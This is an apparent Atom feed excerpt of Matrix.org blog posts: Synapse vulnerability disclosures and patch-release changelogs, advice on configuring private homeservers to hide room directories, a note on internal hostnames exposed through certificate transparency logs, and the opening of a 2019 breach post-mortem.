		<content type="html">&lt;p&gt;Today we are disclosing &lt;a href=&quot;https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name=CVE-2020-26890&quot;&gt;CVE-2020-26890&lt;&#x2F;a&gt; &#x2F; &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;security&#x2F;advisories&#x2F;GHSA-4mp3-385r-v63f&quot;&gt;GHSA-4mp3-385r-v63f&lt;&#x2F;a&gt;, a denial of service vulnerability affecting Synapse versions prior to 1.20.0. We strongly encourage all Synapse admins to upgrade as soon as possible. If you have not upgraded in a while, please refer to the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;blob&#x2F;master&#x2F;UPGRADE.rst&quot;&gt;upgrade notes&lt;&#x2F;a&gt;, especially the latter portion of that document which covers any backwards incompatible changes which you may need to take into consideration.&lt;&#x2F;p&gt;
&lt;p&gt;As a best practice, we encourage Synapse admins to upgrade regularly, and either &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;&quot;&gt;subscribe on GitHub&lt;&#x2F;a&gt; or join &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#homeowners:matrix.org&quot;&gt;#homeowners:matrix.org&lt;&#x2F;a&gt; for low-traffic notifications of new releases.&lt;&#x2F;p&gt;
&lt;p&gt;We extend our thanks to Denis Kasak for reporting this issue, earning a second entry in the Matrix Security &lt;a href=&quot;&#x2F;security-disclosure-policy&quot;&gt;Hall of Fame&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Synapse 1.21.2 released, and security advisory.</title>
		<published>2020-10-15T17:25:42+00:00</published>
		<updated>2020-10-15T17:16:42+00:00</updated>
		<link rel="alternate" href="/blog/2020/10/15/synapse-1-21-2-released-and-security-advisory/" type="text/html"/>
		<id>/blog/2020/10/15/synapse-1-21-2-released-and-security-advisory/</id>
		<content type="html">&lt;p&gt;Hi folks,&lt;&#x2F;p&gt;
&lt;p&gt;Today we have released Synapse 1.21.2, which fixes a couple of minor bugs that crept into the previous release. Full details are below.&lt;&#x2F;p&gt;
&lt;p&gt;Separately, we are advising any administrators who have not yet upgraded to Synapse 1.21.0 or later to do so as soon as possible. Previous versions of Synapse were vulnerable to a cross-site-scripting (XSS) attack; the bug was fixed in Synapse 1.21.0 with &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;8444&quot;&gt;PR #8444&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;The changelog for 1.21.2 is as follows:&lt;&#x2F;p&gt;
&lt;h1 id=&quot;synapse-1-21-2-2020-10-15&quot;&gt;Synapse 1.21.2 (2020-10-15)&lt;&#x2F;h1&gt;
&lt;p&gt;Debian packages and Docker images have been rebuilt using the latest versions of dependency libraries, including authlib 0.15.1. Please see bugfixes below.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;bugfixes&quot;&gt;Bugfixes&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Fix rare bug where sending an event would fail due to a racey assertion. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;8530&quot;&gt;#8530&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;An updated version of the authlib dependency is included in the Docker and Debian images to fix an issue using OpenID Connect. See &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;8534&quot;&gt;#8534&lt;&#x2F;a&gt; for details.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Synapse 1.19.2 released</title>
		<published>2020-09-16T00:00:00+00:00</published>
		<updated>2020-09-16T00:00:00+00:00</updated>
		<link rel="alternate" href="/blog/2020/09/16/synapse-1-19-2-released/" type="text/html"/>
		<id>/blog/2020/09/16/synapse-1-19-2-released/</id>
		<content type="html">&lt;p&gt;&lt;strong&gt;Synapse 1.19.2 is a security patch. All federating instances should upgrade immediately.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Today we are releasing Synapse 1.19.2, which is a security patch release containing a fix to encountering invalid events over federation. We are also putting out a fourth release candidate for the upcoming Synapse 1.20.0 release with the same fix.&lt;&#x2F;p&gt;
&lt;p&gt;The bug prevents affected Synapse instances from joining rooms with invalid events. Server administrators running federating instances are strongly encouraged to update as soon as possible.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Those on Synapse 1.19.1 or earlier should upgrade to Synapse 1.19.2, while those who are running a release candidate of Synapse 1.20.0 should upgrade to 1.20.0rc4.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Get the new releases from any of the usual sources mentioned at https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;blob&#x2F;master&#x2F;INSTALL.md. 1.19.2 is on github &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v1.19.2&quot;&gt;here&lt;&#x2F;a&gt;, and 1.20.0rc4 is &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v1.20.0rc4&quot;&gt;here&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;The changelog for 1.19.2 is as follows:&lt;&#x2F;p&gt;
&lt;h1 id=&quot;synapse-1-19-2-2020-09-16&quot;&gt;Synapse 1.19.2 (2020-09-16)&lt;&#x2F;h1&gt;
&lt;p&gt;Due to the issue below server admins are encouraged to upgrade as soon as possible.
Bugfixes&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Fix joining rooms over federation that include malformed events. (#8324)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Synapse 1.15.2 released with security fixes</title>
		<published>2020-07-02T17:58:57+00:00</published>
		<updated>2020-07-02T17:58:57+00:00</updated>
		<link rel="alternate" href="/blog/2020/07/02/synapse-1-15-2-released-with-security-fixes/" type="text/html"/>
		<id>/blog/2020/07/02/synapse-1-15-2-released-with-security-fixes/</id>
		<content type="html">&lt;p&gt;Folks, today we are releasing Synapse 1.15.2, which is a security release which contains fixes to two separate problems. We are also putting out the second release candidate for the forthcoming Synapse 1.16, including the same fixes.&lt;&#x2F;p&gt;
&lt;p&gt;Firstly, we have fixed a bug in the implementation of the room state resolution algorithm which could cause users to be unexpectedly ejected from rooms (Synapse issue &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;7742&quot;&gt;#7742&lt;&#x2F;a&gt;).&lt;&#x2F;p&gt;
&lt;p&gt;Secondly, we have improved the security of pages served as part of the Single-Sign-on login flows to prevent clickjacking attacks. Thank you to &lt;a href=&quot;https:&#x2F;&#x2F;sandhose.fr&#x2F;&quot;&gt;Quentin Gliech&lt;&#x2F;a&gt; for reporting this.&lt;&#x2F;p&gt;
&lt;p&gt;We are not aware of either of these vulnerabilities being exploited in the wild, but we recommend that administrators upgrade as soon as possible. Those on Synapse 1.15.1 or earlier should upgrade to Synapse 1.15.2, while those who have already upgraded to Synapse 1.16.0rc1 should upgrade to 1.16.0rc2.&lt;&#x2F;p&gt;
&lt;p&gt;Get the new releases from any of the usual sources mentioned at https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;blob&#x2F;master&#x2F;INSTALL.md. 1.15.2 is on github &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v1.15.2&quot;&gt;here&lt;&#x2F;a&gt;, and 1.16.0rc2 is &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v1.16.0rc2&quot;&gt;here&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Changelog for 1.15.2 follows:&lt;&#x2F;p&gt;
&lt;h2 id=&quot;synapse-1-15-2-2020-07-02&quot;&gt;Synapse 1.15.2 (2020-07-02)&lt;&#x2F;h2&gt;
&lt;p&gt;Due to the two security issues highlighted below, server administrators are
encouraged to update Synapse. We are not aware of these vulnerabilities being
exploited in the wild.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;security-advisory&quot;&gt;Security advisory&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;A malicious homeserver could force Synapse to reset the state in a room to a
small subset of the correct state. This affects all Synapse deployments which
federate with untrusted servers. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;commit&#x2F;96e9afe62500310977dc3cbc99a8d16d3d2fa15c&quot;&gt;96e9afe6&lt;&#x2F;a&gt;)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;HTML pages served via Synapse were vulnerable to clickjacking attacks. This
predominantly affects homeservers with single-sign-on enabled, but all server
administrators are encouraged to upgrade.  (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;commit&#x2F;ea26e9a98b0541fc886a1cb826a38352b7599dbe&quot;&gt;ea26e9a9&lt;&#x2F;a&gt;)&lt;&#x2F;p&gt;
&lt;p&gt;This was reported by &lt;a href=&quot;https:&#x2F;&#x2F;sandhose.fr&#x2F;&quot;&gt;Quentin Gliech&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Avoiding unwelcome visitors on private Matrix servers</title>
		<published>2019-11-09T00:00:00+00:00</published>
		<updated>2019-11-09T00:00:00+00:00</updated>
		<link rel="alternate" href="/blog/2019/11/09/avoiding-unwelcome-visitors-on-private-matrix-servers/" type="text/html"/>
		<id>/blog/2019/11/09/avoiding-unwelcome-visitors-on-private-matrix-servers/</id>
		<content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;Over the course of today we&#x27;ve been made aware of folks port-scanning the
general internet to discover private Matrix servers, looking for publicly
visible room directories, and then trying to join rooms listed in them.&lt;&#x2F;p&gt;
&lt;p&gt;If you are running a Matrix server that is intended to be private, you must correctly
configure your server to not expose its public room list to the general public -
and also ensure that any sensitive rooms are invite-only (especially if the
server is federated with the public Matrix network).&lt;&#x2F;p&gt;
&lt;p&gt;In Synapse, this means ensuring that the following options are set correctly in
your &lt;code&gt;homeserver.yaml&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#1e1e1e;color:#dcdcdc;&quot;&gt;&lt;code&gt;&lt;span&gt;# If set to &amp;#39;false&amp;#39;, requires authentication to access the server&amp;#39;s public rooms
&lt;&#x2F;span&gt;&lt;span&gt;# directory through the client API. Defaults to &amp;#39;true&amp;#39;.
&lt;&#x2F;span&gt;&lt;span&gt;#
&lt;&#x2F;span&gt;&lt;span&gt;#allow_public_rooms_without_auth: false
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;# If set to &amp;#39;false&amp;#39;, forbids any other homeserver to fetch the server&amp;#39;s public
&lt;&#x2F;span&gt;&lt;span&gt;# rooms directory via federation. Defaults to &amp;#39;true&amp;#39;.
&lt;&#x2F;span&gt;&lt;span&gt;#
&lt;&#x2F;span&gt;&lt;span&gt;#allow_public_rooms_over_federation: false
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;strong&gt;For private servers, you will almost certainly want to explicitly set these to
&lt;code&gt;false&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;, meaning that the server&#x27;s &amp;quot;public&amp;quot; room directory is hidden from the
general internet and wider Matrix network.&lt;&#x2F;p&gt;
&lt;p&gt;You can test whether your room directory is visible to arbitrary Matrix clients
on the general internet by viewing a URL like
https:&#x2F;&#x2F;sandbox.modular.im&#x2F;_matrix&#x2F;client&#x2F;r0&#x2F;publicRooms (but for your server). 
If it gives a &amp;quot;Missing access token&amp;quot; error, you are okay.&lt;&#x2F;p&gt;
&lt;p&gt;You can test whether your room directory is visible to arbitrary Matrix servers
on the general internet by loading Riot (or similar) on another server, and
entering the target server&#x27;s domain name into the room directory&#x27;s server
selection box.  If you can&#x27;t see any rooms, then are okay.&lt;&#x2F;p&gt;
&lt;p&gt;Relatedly, &lt;strong&gt;please ensure that any sensitive rooms are set to be &amp;quot;invite only&amp;quot;
and room history is not world visible&lt;&#x2F;strong&gt; - particularly if your server is
federated, or if it has public registration enabled.  This stops random
members of the public peeking into them (let alone joining them).&lt;&#x2F;p&gt;
&lt;p&gt;Relying on security-by-obscurity is a very bad idea: all it takes is for someone
to scan the whole internet for Matrix servers, and then trying to join (say)
#finance on each discovered domain (either by signing up on that
server or by trying to join over federation) to cause problems.&lt;&#x2F;p&gt;
&lt;p&gt;Finally, if you don&#x27;t want the general public reading your room directory,
please also remember to turn off public registration on your homeserver.
Otherwise even with the changes above, if randoms can sign up on your server
to view &amp;amp; join rooms then all bets are off.&lt;&#x2F;p&gt;
&lt;p&gt;We&#x27;ll be rethinking the security model of room directories in future (e.g.
whether to default them to being only visible to registered users on the local
server, or whether to replace per-server directories with per-community
directories with finer grained access control, etc) - but until this is sorted,
please heed this advice.&lt;&#x2F;p&gt;
&lt;p&gt;If you have concerns about randoms having managed to discover or join rooms
which should have been private, please contact security@matrix.org.&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Fun and games with certificate transparency logs</title>
		<published>2019-11-06T00:00:00+00:00</published>
		<updated>2019-11-06T00:00:00+00:00</updated>
		<link rel="alternate" href="/blog/2019/11/06/fun-and-games-with-certificate-transparency-logs/" type="text/html"/>
		<id>/blog/2019/11/06/fun-and-games-with-certificate-transparency-logs/</id>
		<content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;This morning (06:11 UTC) it became apparent through mails to support@matrix.org that a security researcher was working through the TLS Certificate Transparency logs for &lt;code&gt;*.matrix.org&lt;&#x2F;code&gt;,&lt;code&gt;*.riot.im&lt;&#x2F;code&gt; and &lt;code&gt;*.modular.im&lt;&#x2F;code&gt; to identify and try to access non-public services run by New Vector (the company formed by the original Matrix team, which hosts &lt;code&gt;*.matrix.org&lt;&#x2F;code&gt; on behalf of the Matrix.org Foundation, and develops Riot and runs the https:&#x2F;&#x2F;modular.im hosting service).&lt;&#x2F;p&gt;
&lt;p&gt;Certificate Transparency (CT) is a feature of the TLS ecosystem which lets you see which public certificates have been created and signed by given authorities - intended to help identify and mitigate against malicious certificates.  This means that the DNS name of any host with a dedicated public TLS certificate (i.e. not using a wildcard certificate) is visible to the general public.&lt;&#x2F;p&gt;
&lt;p&gt;In practice, this revealed a handful of internal-facing services using dedicated public TLS certificates which were accessible to the general internet - some of which should have been locked to be accessible only from our internal network.&lt;&#x2F;p&gt;
&lt;p&gt;Specifically:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;kibana.ap-southeast-1.k8s.i.modular.im&lt;&#x2F;code&gt; - a Kibana deployment for a new experimental Modular cluster which is being set up in SE Asia. The Kibana is in the middle of being deployed, and was exposed without authentication during deployment due to a firewall &amp;amp; config error.  However, &lt;strong&gt;it is not a production system and carries no production traffic or user data&lt;&#x2F;strong&gt; (it was just being used for experimentation for hypothetical geography-specific Modular deployments).  We firewalled this off at 07:53 UTC, and are doing analysis to confirm there was no further compromise, and will then rebuild the cluster (having fixed the firewall config error from repeating).&lt;&#x2F;li&gt;
&lt;li&gt;AWX deployments used by our internal Modular platform, which were behind authentication but should not be exposed to the public net.&lt;&#x2F;li&gt;
&lt;li&gt;Various semi-internal dev and testing services which should be IP-locked to our internal network (but are all locked behind authentication too).&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Additionally, certain historical Modular homeservers &amp;amp; Riots (from before we switched to using wildcard certs, or where we’ve created a custom LetsEncrypt certificate for the server) are named in the CT logs - thus leaking the server’s name (which is typically public anyway in that server’s matrix IDs if the server is federated).&lt;&#x2F;p&gt;
&lt;p&gt;We’re working through the services whose names were exposed checking for any other issues, but other than the non-production SE Asia Kibana instance we are not aware of problems resulting from this activity.&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile, we’ll be ensuring that semi-internal services are only exposed on our internal network in future, and that Modular server names are not exposed by CT logs where possible.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;TL;DR&lt;&#x2F;strong&gt;: You can list all the public non-wildcard TLS certs for a given domain by looking somewhere like https:&#x2F;&#x2F;crt.sh&#x2F;?q=%25.matrix.org.  This lets you find internal-sounding services to try to attack.  In practice no production services were compromised, and most of our internal services are correctly firewalled from the public internet.  However, we’re reviewing the IP locking for ones in the grey zone (and preventing the bug which caused an experimental Kibana to be exposed without auth).&lt;&#x2F;p&gt;
&lt;p&gt;We’d like to thank Linda Lapinlampi for notifying us about this.  We’d also like to remind everyone that we operate a Security Disclosure Policy (SDP) and Hall of Fame at https:&#x2F;&#x2F;matrix.org&#x2F;security-disclosure-policy&#x2F; which is designed to protect innocent users from being hurt by security issues - everyone: please consider disclosing issues responsibly to us as per the SDP.&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Post-mortem and remediations for Apr 11 security incident</title>
		<published>2019-05-08T00:00:00+00:00</published>
		<updated>2019-05-08T00:00:00+00:00</updated>
		<link rel="alternate" href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/" type="text/html"/>
		<id>/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/</id>
		<content type="html">&lt;h3 id=&quot;table-of-contents&quot;&gt;Table of contents&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#introduction&quot;&gt;Introduction&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#history&quot;&gt;History&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#the-incident&quot;&gt;The Incident&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#the-defacement&quot;&gt;The Defacement&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#the-rebuild&quot;&gt;The Rebuild&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#remediations&quot;&gt;Remediations&lt;&#x2F;a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#ssh&quot;&gt;SSH&lt;&#x2F;a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#ssh-agent-forwarding-should-be-disabled&quot;&gt;SSH agent forwarding should be disabled.&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#ssh-should-not-be-exposed-to-the-general-internet&quot;&gt;SSH should not be exposed to the general internet&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#ssh-keys-should-give-minimal-access&quot;&gt;SSH keys should give minimal access&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#two-factor-authentication&quot;&gt;Two factor authentication&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#it-should-be-made-as-hard-as-possible-to-add-malicious-ssh-keys&quot;&gt;It should be made as hard as possible to add malicious SSH keys&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#changes-to-ssh-keys-should-be-carefully-monitored&quot;&gt;Changes to SSH keys should be carefully monitored&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#ssh-config-should-be-hardened-disabling-unnecessary-options&quot;&gt;SSH config should be hardened, disabling unnecessary options&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#network-architecture&quot;&gt;Network architecture&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#keeping-patched&quot;&gt;Keeping patched&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#intrusion-detection&quot;&gt;Intrusion detection&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#incident-management&quot;&gt;Incident management&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#configuration-management&quot;&gt;Configuration management&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#avoiding-temporary-measures-which-last-forever&quot;&gt;Avoiding temporary measures which last forever&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#secure-packaging&quot;&gt;Secure packaging&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#dev-and-ci-infrastructure&quot;&gt;Dev and CI infrastructure&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#log-minimisation-and-handling-personally-identifying-information-pii&quot;&gt;Log minimisation and handling Personally Identifying Information (PII)&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#conclusion&quot;&gt;Conclusion&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;introduction&quot;&gt;Introduction&lt;&#x2F;h3&gt;
&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;On April 11th we dealt with a major security incident impacting the infrastructure which runs the Matrix.org homeserver - specifically: removing an attacker who had gained superuser access to much of our production network.  We provided updates at the time as events unfolded on April 11 and 12 via &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;matrixdotorg&#x2F;status&#x2F;1116304867683905537&quot;&gt;Twitter&lt;&#x2F;a&gt; and our &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;04&#x2F;11&#x2F;security-incident&#x2F;&quot;&gt;blog&lt;&#x2F;a&gt;, but in this post we’ll try to give a full analysis of what happened and, critically, what we have done to avoid this happening again in future.  Apologies that this has taken several weeks to put together: the time-consuming process of rebuilding after the breach has had to take priority, and we also wanted to get the key remediation work in place before writing up the post-mortem.&lt;&#x2F;p&gt;
&lt;p&gt;Firstly, please understand that &lt;strong&gt;this incident was not due to issues in the Matrix protocol itself or the wider Matrix network&lt;&#x2F;strong&gt; - and indeed everyone who wasn’t on the Matrix.org server should have barely noticed.  If you see someone say “Matrix got hacked”, please politely but firmly explain to them that the servers which run the oldest and biggest instance got compromised via a Jenkins vulnerability and bad ops practices, but &lt;strong&gt;the protocol and network itself was not impacted&lt;&#x2F;strong&gt;.  This is not to say that the Matrix protocol itself is bug free - indeed we are still in the process of exiting beta (delayed by this incident), but &lt;strong&gt;this incident was not related to the protocol&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Before we get stuck in, we would like to apologise unreservedly to everyone impacted by this whole incident.  Matrix is an altruistic open source project, and our mission is to try to make the world a better place by providing a secure decentralised communication protocol and network for the benefit of everyone; giving users total control back over how they communicate online.&lt;&#x2F;p&gt;
&lt;p&gt;In this instance, our focus on trying to improve the protocol and network came at the expense of investing sysadmin time around the legacy Matrix.org homeserver and project infrastructure which we provide as a free public service to help bootstrap the Matrix ecosystem, and we paid the price.&lt;&#x2F;p&gt;
&lt;p&gt;This post will hopefully illustrate that we have learnt our lessons from this incident and will not be repeating them - and indeed intend to come out of this episode stronger than you can possibly imagine :)&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile, if you think that the world needs Matrix, &lt;strong&gt;please&lt;&#x2F;strong&gt; consider supporting us via &lt;a href=&quot;https:&#x2F;&#x2F;patreon.com&#x2F;matrixdotorg&quot;&gt;Patreon&lt;&#x2F;a&gt; or &lt;a href=&quot;http:&#x2F;&#x2F;liberapay.com&#x2F;matrixdotorg&quot;&gt;Liberapay&lt;&#x2F;a&gt;.  Not only will this make it easier for us to invest in our infrastructure in future, it also makes projects like &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;pantalaimon&quot;&gt;Pantalaimon&lt;&#x2F;a&gt; (E2EE compatibility for all Matrix clients&#x2F;bots) possible, which are effectively being financed entirely by donations.  The funding we raised in Jan 2018 is not going to last forever, and we are currently looking into new longer-term funding approaches - for which we need your support.&lt;&#x2F;p&gt;
&lt;p&gt;Finally, if you happen across security issues in Matrix or matrix.org’s infrastructure, please please consider disclosing them responsibly to us as per our &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;security-disclosure-policy&#x2F;&quot;&gt;Security Disclosure Policy&lt;&#x2F;a&gt;, in order to help us improve our security while protecting our users.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;history&quot;&gt;History&lt;&#x2F;h3&gt;
&lt;p&gt;Firstly, some context about Matrix.org’s infrastructure.  The public Matrix.org homeserver and its associated services runs across roughly 30 hosts, spanning the actual homeserver, its DBs, load balancers, intranet services, website, bridges, bots, integrations, video conferencing, CI, etc.  We provide it as a free public service to the Matrix ecosystem to help bootstrap the network and make life easier for first-time users.&lt;&#x2F;p&gt;
